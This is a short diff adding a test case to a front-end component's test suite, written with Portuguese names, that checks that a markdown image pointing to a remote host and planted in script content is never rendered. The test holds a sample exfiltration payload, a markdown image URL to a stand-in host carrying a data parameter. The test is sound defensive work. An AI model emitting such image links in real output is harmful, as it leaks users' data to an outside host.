@@ -118,6 +118,13 @@ describe("FluxoCard", () => {
       expect(inv).not.toHaveBeenCalled();
     });
 
+    it("imagem remota plantada no roteiro nunca vira <img> (exfiltração)", () => {
+      rot.q.mockReturnValue(roteiroQ({ id: "r1", status: "completo", conteudo: "Fala ![x](https://x.tld/?d=bio)" }));
+      const { container } = renderCard(rp());
+      expect(container.querySelector("img")).toBeNull();
+      expect(container.innerHTML).not.toContain("x.tld");
+    });
+
     it("headline e card prontos avançam os passos", () => {
       rot.q.mockReturnValue(roteiroQ({ id: "r1", status: "completo", conteudo: "x" }));
       renderCard(rp({ etapa: "roteiro_pronto", headline: { id: "h9", texto: "Headline do roteiro" }, post: { id: "post1", titulo: "t", etapa_label: "Roteiro" } }));
